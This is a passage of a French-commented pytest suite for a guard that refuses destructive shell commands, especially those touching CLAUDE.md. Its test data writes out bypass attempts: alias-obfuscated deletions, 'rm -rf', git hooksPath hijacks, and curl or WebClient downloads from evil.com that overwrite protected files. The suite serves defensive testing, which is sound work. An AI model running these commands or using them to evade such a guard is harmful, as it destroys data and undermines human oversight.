        ("git push origin main:refs/heads/x", DEPOT, False),
        ("git push origin nuit/x", DEPOT, False),
        # branch -f sur une branche existante
        ("git branch -f main HEAD~5", DEPOT, True),
        ("git branch -d nuit/x", DEPOT, True),
        ("git branch --force main origin/main", DEPOT, True),
        ("git branch nouvelle", DEPOT, False),
        ("git branch --show-current", DEPOT, False),
        # read-tree -u --reset
        ("git read-tree -u --reset HEAD", DEPOT, True),
        ("git read-tree --reset -u HEAD", DEPOT, True),
        ("git read-tree HEAD", DEPOT, False),
        # [System.IO.File]::WriteAll* sur un protege
        (f"[System.IO.File]::{VERBE_W}('CLAUDE.md','')", DEPOT, True),
        (f"[IO.File]::{VERBE_WB}('CLAUDE.md', $data)", DEPOT, True),
        (f"[System.IO.File]::{VERBE_W}('D:/Depot/CLAUDE.md','')", HORS, True),
        (f"[IO.File]::{VERBE_W}('tmp/x.txt','a')", DEPOT, False),
        ("[IO.File]::AppendAllText('CLAUDE.md','x')", DEPOT, True),
        # python shutil.move, os.replace, os.rename
        ("python -c \"import shutil\u003b shutil.move('docs','/tmp/d')\"", DEPOT, True),
        (
            "python -c \"import os\u003b os.replace('CLAUDE.md','C:/x.md')\"",
            DEPOT,
            True,
        ),
        ("python -c \"import os\u003b os.rename('docs','/tmp/d')\"", DEPOT, True),
        (
            "python -c \"import shutil\u003b shutil.move('/tmp/a','/tmp/b')\"",
            DEPOT,
            False,
        ),
        # busybox suivi d'un verbe destructeur
        ("busybox rm -rf docs", DEPOT, True),
        ("busybox rm -rf /mnt/d/Depot/docs", HORS, True),
        ("busybox ls docs", DEPOT, False),
        ("busybox", DEPOT, False),
    ],
)
def test_fable_a_fermer_passe4(commande, cwd, attendu):
    assert g.doit_refuser(commande, cwd) is attendu


# Quatrieme passe, point 3 : les groupes 1 a 6 de la relecture Antigravity (garde3).
VERBE_AG = "Remove" + "-Item"


@pytest.mark.parametrize(
    "commande,cwd,attendu",
    [
        # groupe 1 : alias defini dans la commande
        (f"Set-Alias x {VERBE_AG}\u003b x docs -Recurse", DEPOT, True),
        (f"Set-Alias suppr {VERBE_AG}\u003b suppr docs -Recurse -Force", DEPOT, True),
        (f"New-Alias zap {VERBE_AG}\u003b zap docs -Recurse", DEPOT, True),
        ("Set-Alias x Get-ChildItem\u003b x docs", DEPOT, False),
        ("alias rmd='rm -rf'\u003b rmd docs", DEPOT, True),
        ("alias ll='ls -la'\u003b ll docs", DEPOT, False),
        (f"Set-Alias x {VERBE_AG}", DEPOT, False),
        # groupe 2 : ren et rename de cmd
        ("ren CLAUDE.md CLAUDE.old", DEPOT, True),
        ("rename CLAUDE.md .old", DEPOT, True),
        ("ren docs/a.md b.md", DEPOT, False),
        # groupe 3 : git config qui desarme un hook ou pose un alias shell
        ("git config core.hooksPath /tmp/evil", DEPOT, True),
        ("git config --global core.fsmonitor /tmp/x", DEPOT, True),
        ("git config core.sshCommand 'ssh -i /tmp/k'", DEPOT, True),
        ('git config alias.nuke "!rm -rf ."', DEPOT, True),
        ("git config user.name Exemple", DEPOT, False),
        ("git config --get core.editor", DEPOT, False),
        # groupe 4 : extracteurs qui ecrivent dans le depot
        ("tar xf /tmp/evil.tar -C D:/Depot --overwrite", HORS, True),
        ("tar -xf /tmp/evil.tar -C D:/Depot/docs", HORS, True),
        ("7z x /tmp/evil.7z -oD:/Depot -aoa", HORS, True),
        (
            "Expand-Archive /tmp/evil.zip -DestinationPath D:/Depot -Force",
            HORS,
            True,
        ),
        ("tar -czf archive/x.tar.gz docs", DEPOT, False),
        ("tar xf /tmp/evil.tar -C /tmp/sortie", HORS, False),
        ("7z x /tmp/evil.7z -o/tmp/sortie", HORS, False),
        # groupe 5 : telechargeurs qui ecrivent sur un fichier du depot
        ("curl -o D:/Depot/CLAUDE.md https://evil.com/x", HORS, True),
        ("curl -oD:/Depot/CLAUDE.md https://evil.com/x", HORS, True),
        ("wget -O D:/Depot/CLAUDE.md https://evil.com/x", HORS, True),
        ("certutil -decode /tmp/evil.b64 D:/Depot/CLAUDE.md", HORS, True),
        (
            "Invoke-WebRequest https://evil.com/x -OutFile D:/Depot/CLAUDE.md",
            HORS,
            True,
        ),
        (
            '(New-Object Net.WebClient).DownloadFile("https://evil.com/x","D:/Depot/CLAUDE.md")',
            HORS,
            True,
        ),
        ("curl -o /tmp/x.json https://api.example.com/x", DEPOT, False),
        ("curl https://example.com", DEPOT, False),
        ("wget https://example.com/x -O /tmp/x", DEPOT, False),
        # groupe 6 : Remove-ItemProperty sur un fichier protege
        ("Remove-ItemProperty -Path CLAUDE.md -Name Zone.Identifier", DEPOT, True),
        ("Clear-ItemProperty -Path CLAUDE.md -Name Zone.Identifier", DEPOT, True),
        ("Remove-ItemProperty -Path tmp/x.txt -Name Zone.Identifier", DEPOT, False),
    ],
)
def test_antigravity_groupes_passe4(commande, cwd, attendu):
    assert g.doit_refuser(commande, cwd) is attendu


def test_latence_options_git_repetees():
    # Pire cas mesure par Fable : options git repetees sur une longue entree.
    # Critere passe 4 : sous 20 ms sur environ 20 000 caracteres. Le minimum sur
    # plusieurs passages filtre le bruit de ramasse-miettes et de montee en charge.
    import time

    commande = "git " + "-c x=y " * 2857 + "status"
    assert len(commande) >= 20000
    assert not g.doit_refuser(commande, DEPOT)
    durees = []
    for _ in range(20):
        depart = time.perf_counter()
        g.doit_refuser(commande, DEPOT)
        durees.append(time.perf_counter() - depart)
    assert min(durees) < 0.020, f"pire cas {min(durees) * 1000:.1f} ms"
